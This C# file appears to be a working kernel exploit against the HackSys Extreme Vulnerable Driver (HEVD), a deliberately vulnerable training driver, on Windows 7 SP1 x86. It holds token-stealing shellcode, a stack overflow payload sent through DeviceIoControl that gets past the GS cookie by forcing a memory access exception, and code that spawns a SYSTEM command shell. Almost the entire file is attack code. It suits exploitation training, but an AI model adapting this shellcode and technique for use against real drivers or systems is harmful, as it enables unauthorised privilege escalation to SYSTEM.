using System;
using System.Runtime.InteropServices;
using System.Text;

namespace StackOverflowGS
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential)]
        struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
        struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll")]
        static extern void RtlGetNtVersionNumbers(
            ref int MajorVersion,
            ref int MinorVersion,
            ref int BuildNumber);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(
            IntPtr lpAddress,
            uint dwSize,
            uint flAllocationType,
            uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(
            IntPtr lpAddress,
            uint dwSize,
            uint dwFreeType);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr CreateFile(
            string lpFileName,
            uint dwDesiredAccess,
            uint dwShareMode,
            IntPtr lpSecurityAttributes,
            uint dwCreationDisposition,
            uint dwFlagsAndAttributes,
            IntPtr hTemplateFile);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool DeviceIoControl(
            IntPtr hDevice,
            uint dwIoControlCode,
            IntPtr InBuffer,
            int nInBufferSize,
            IntPtr OutBuffer,
            int nOutBufferSize,
            ref int pBytesReturned,
            IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint WaitForSingleObject(IntPtr hHandle, int dwMilliseconds);

        // Global variables
        static IntPtr hDevice = IntPtr.Zero;

        // Helper functions
        static void CleanUp()
        {
            Console.WriteLine("[>] Cleaning up handle object(s)");
            if (hDevice != IntPtr.Zero)
            {
                if (CloseHandle(hDevice))
                {
                    hDevice = IntPtr.Zero;
                }
                else
                {
                    Console.WriteLine("[!] Failed to close a kernel driver's handle (code={0})", Marshal.GetLastWin32Error());
                }
            }
        }

        static bool IsWin7x86()
        {
            string arch = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
            int MajorVersion = 0;
            int MinorVersion = 0;
            int BuildNumber = 0;
            RtlGetNtVersionNumbers(ref MajorVersion, ref MinorVersion, ref BuildNumber);
            BuildNumber &= 0xFFFF;

            if (MajorVersion == 6 && MinorVersion == 1 && BuildNumber == 7601 &&
                string.Compare(arch, "x86", StringComparison.OrdinalIgnoreCase) == 0)
            {
                Console.WriteLine("[+] Windows 7 SP1 x86 is detected");
                return true;
            }
            else
            {
                Console.WriteLine("[-] Unsupported OS is detected");
                return false;
            }
        }

        static bool IsSystem()
        {
            string user = Environment.UserName;

            if (string.Compare(user, "SYSTEM", StringComparison.OrdinalIgnoreCase) == 0)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        static bool SpawnShell()
        {
            string ApplicationName = "C:\\Windows\\System32\\cmd.exe";
            SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
            SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
            uint CREATE_NEW_CONSOLE = 0x00000010;
            string CurrentDirectory = "C:\\Windows\\System32";
            STARTUPINFO si = new STARTUPINFO();
            pSec.nLength = Marshal.SizeOf(pSec);
            tSec.nLength = Marshal.SizeOf(tSec);

            bool status = CreateProcess(
                ApplicationName, null, ref pSec, ref tSec, false,
                CREATE_NEW_CONSOLE, IntPtr.Zero, CurrentDirectory,
                ref si, out PROCESS_INFORMATION pi);

            if (status)
            {
                Console.WriteLine("[+] Shell is spawned successfully (PID = {0})", pi.dwProcessId);
                WaitForSingleObject(pi.hProcess, 500);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            else
            {
                Console.WriteLine("[!] Failed to spawn shell (code={0})", Marshal.GetLastWin32Error());
            }

            return status;
        }

        // Main function
        static void Main()
        {
            byte[] shellcode = {
                //--[Setup]
                0x60,                               // pushad
                0x64, 0xA1, 0x24, 0x01, 0x00, 0x00, // mov eax, fs:[KTHREAD_OFFSET]
                0x8B, 0x40, 0x50,                   // mov eax, [eax + EPROCESS_OFFSET]
                0x89, 0xC1,                         // mov ecx, eax (Current _EPROCESS structure)
                0x8B, 0x98, 0xF8, 0x00, 0x00, 0x00, // mov ebx, [eax + TOKEN_OFFSET]
                //--[Copy System PID token]
                0xBA, 0x04, 0x00, 0x00, 0x00,       // mov edx, 4 (SYSTEM PID)
                0x8B, 0x80, 0xB8, 0x00, 0x00, 0x00, // mov eax, [eax + FLINK_OFFSET] <-|
                0x2D, 0xB8, 0x00, 0x00, 0x00,       // sub eax, FLINK_OFFSET           |
                0x39, 0x90, 0xB4, 0x00, 0x00, 0x00, // cmp [eax + PID_OFFSET], edx     |
                0x75, 0xED,                         // jnz                           ->|
                0x8B, 0x90, 0xF8, 0x00, 0x00, 0x00, // mov edx, [eax + TOKEN_OFFSET]
                0x89, 0x91, 0xF8, 0x00, 0x00, 0x00, // mov [ecx + TOKEN_OFFSET], edx
                //--[Recover]
                0x61,                               // popad
                0x81, 0xC4, 0x8C, 0x07, 0x00, 0x00, // add esp,0x78c           ; Offset of IRP on stack
                0x8B, 0x3C, 0x24,                   // mov edi,DWORD PTR [esp] ; Restore the pointer to IRP
                0x83, 0xC4, 0x08,                   // add esp,0x8             ; Offset of DbgPrint string
                0x8B, 0x1C, 0x24,                   // mov ebx,DWORD PTR [esp] ; Restore the DbgPrint string
                0x81, 0xC4, 0x34, 0x02, 0x00, 0x00, // add esp,0x234           ; Target frame to return
                0x31, 0xC0,                         // xor eax, eax            ; NTSTATUS -> STATUS_SUCCESS
                0x5D,                               // pop ebp                 ; Restore saved EBP
                0xC2, 0x08, 0x00                    // ret 8                   ; Return cleanly
            };

            Console.WriteLine("--[ HEVD Exploitation : Stack Overflow GS\n");

            if (!IsWin7x86())
            {
                return;
            }

            // Step 1: Allocate memory for shellcode
            IntPtr ShellcodeBuffer;
            uint dwSize = 0x2000;
            uint MEM_COMMIT = 0x00001000;
            uint MEM_RESERVE = 0x00002000;
            uint PAGE_EXECUTE_READWRITE = 0x40;

            Console.WriteLine("[>] Trying to allocate shellcode.");
            ShellcodeBuffer = VirtualAlloc(IntPtr.Zero, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            if (ShellcodeBuffer == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to VirtualAlloc (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] Allocated {0} bytes buffer at 0x{1}.", dwSize, ShellcodeBuffer.ToString("X8"));

            // Step 2: Free memory to trigger memory access exception with memcpy
            IntPtr FreeBuffer = new IntPtr(ShellcodeBuffer.ToInt32() + 0x1000);
            dwSize = 0x1000;
            uint MEM_DECOMMIT = 0x00004000;

            Console.WriteLine("[>] Trying to free memory page from 0x{0}.", FreeBuffer.ToString("X8"));
            bool status = VirtualFree(FreeBuffer, dwSize, MEM_DECOMMIT);

            if (!status)
            {
                Console.WriteLine("[-] Failed to VirtualFree (code={0})", Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] VirtualFree is successful.");

            // Step 3: Set shellcode and payload
            Marshal.Copy(shellcode, 0, ShellcodeBuffer, shellcode.Length);

            byte[] padding = Encoding.ASCII.GetBytes(new String('A', 0x210));
            byte[] callback = BitConverter.GetBytes(ShellcodeBuffer.ToInt32());
            byte[] payload = new byte[padding.Length + callback.Length];
            padding.CopyTo(payload, 0);
            callback.CopyTo(payload, padding.Length);

            IntPtr PayloadPointer = new IntPtr(FreeBuffer.ToInt32() - payload.Length);
            Marshal.Copy(payload, 0, PayloadPointer, payload.Length);

            // Step 4: Open driver's handle
            string deviceName = "\\\\.\\HacksysExtremeVulnerableDriver";
            uint GENERIC_READ = 0x80000000;
            uint GENERIC_WRITE = 0x40000000;
            uint FILE_SHARE_READ = 0x00000001;
            uint FILE_SHARE_WRITE = 0x00000002;
            uint OPEN_EXISTING = 0x3;
            uint FILE_ATTRIBUTE_NORMAL = 0x80;
            uint FILE_FLAG_OVERWRAPPED = 0x40000000;
            IntPtr invalid = new IntPtr(-1);

            Console.WriteLine("[>] Opening {0}", deviceName);
            hDevice = CreateFile(
                deviceName, GENERIC_READ | GENERIC_WRITE,
                FILE_SHARE_READ | FILE_SHARE_WRITE, IntPtr.Zero,
                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERWRAPPED, IntPtr.Zero);

            if (hDevice == invalid)
            {
                Console.WriteLine("[-] Failed to open {0} (code={1})", deviceName, Marshal.GetLastWin32Error());
                return;
            }

            Console.WriteLine("[+] HEVD.sys is opened succesfuly (hDevice = 0x{0})", hDevice.ToString("X"));

            // Step 5: Trigger stack overflow and memory access exception
            uint ioctl = 0x222007;
            int BytesReturned = 0;

            Console.WriteLine("[>] Triggering stack overflow and memory access exception.");
            status = DeviceIoControl(hDevice, ioctl, PayloadPointer, payload.Length + 0x4, IntPtr.Zero, 0, ref BytesReturned, IntPtr.Zero);

            if (!status)
            {
                Console.WriteLine("[-] Failed to send payload (code={0})", Marshal.GetLastWin32Error());
                CleanUp();
                return;
            }
            CleanUp();

            // Step 6: Spawn SYSTEM shell
            if (IsSystem() && SpawnShell())
            {
                Console.WriteLine("[+] Exploit is completed successfully");
            }
            else
            {
                Console.WriteLine("[-] Failed to exploit.");
            }
        }
    }
}